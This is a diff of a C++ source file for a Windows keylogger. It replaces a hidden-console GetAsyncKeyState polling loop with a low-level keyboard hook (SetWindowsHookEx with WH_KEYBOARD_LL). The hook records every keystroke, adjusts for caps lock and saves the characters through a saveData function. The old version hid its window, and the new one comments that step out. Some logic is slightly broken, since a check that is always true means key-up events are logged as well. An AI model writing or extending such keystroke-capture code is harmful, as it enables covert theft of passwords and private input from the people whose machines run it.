@@ -5,40 +5,82 @@
 #include <bits/stdc++.h>
 #include <conio.h>
 #include "mainloop.h"
-#include "key_logging.h"
+#include "key_save.h"
 #include "transSpecialKey.h"
+
+int save(char kbdChar, bool capsLock){
+
+    switch(capsLock){
+        case true:
+            std::cout << "char : " << kbdChar << std::endl;
+            saveData(std::string(1, std::toupper(kbdChar)));
+            break;
+        case false:
+            std::cout << "char : " << kbdChar << std::endl;
+           saveData(std::string(1, std::tolower(kbdChar)));
+            break;
+    }
+
+    return 0;
+}
+
+int saveSPKey(std::string specialKey){
+    std::cout << "char : " << specialKey << std::endl;
+    saveData(specialKey);
+
+    return 0;
+}
+
+char cnvToChar(int vkCode){
+    char kbdChar;
+    kbdChar = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
+    return kbdChar;
+}
+
+LRESULT CALLBACK KBHook(int nCode, WPARAM wParam, LPARAM lParam){
+    KBDLLHOOKSTRUCT *KBDLLStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);   
+
+    if(WM_KEYDOWN){
+        int vkCode = KBDLLStruct->vkCode;
+        
+        if(GetKeyState(VK_CAPITAL)){
+            //CAPSLOCK is ONq
+            std::cout << "CAPSLOCK is ON" << std::endl;
+            bool capsLock = true;
+            char kbdChar = cnvToChar(vkCode);
+            save(kbdChar, capsLock);
+        } else {
+            std::cout << "CAPSLOCK is OFF" << std::endl;
+            //CAPSLOCK is OFF
+            bool capsLock = false;
+            char kbdChar = cnvToChar(vkCode);
+            save(kbdChar, capsLock);
+            
+        }
+    }
+
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
 
 void MainLoop::run(){
 
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
+    //HWND hwnd = GetConsoleWindow();
+    //ShowWindow(hwnd, SW_HIDE);
 
-    while (true) {
+    std::cout << "Hello World!" << std::endl;
 
-        for (int key = 8; key <= 190; key++){
-            //std::cout << "Running : " << std::endl;
-            if(GetAsyncKeyState(key) == -32767){
-                
-                //std::cout << "Key : "<< key << std::endl;
-                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), 
-                    key) != std::end(specialKeyArray);
+    HHOOK kbd = SetWindowsHookEx(
+        WH_KEYBOARD_LL,
+        &KBHook,
+        0,
+        0
+    );
 
-                if(isSpecialKey){
-                    specialKeyChar = translateSpecialKey(key);
-
-                    saveData(specialKeyChar);
-                } else {
-                    if(GetKeyState(VK_CAPITAL)) {
-                        // CAPSLOCK is on
-                        saveData(std::string(1, (char)key));
-                    } else {
-                        // CAPSLOCK is off
-                        // Turn the character into lowercase before save
-                        saveData(std::string(1, (char)std::tolower(key)));
-                    }
-                }
-            }
-        }
-        char temp = getch();
+    MSG message;
+    while(GetMessage(&message, NULL, 0, 0)){
+        TranslateMessage(&message);
+        DispatchMessage(&message);
     }
+
+    UnhookWindowsHookEx(kbd);
 }
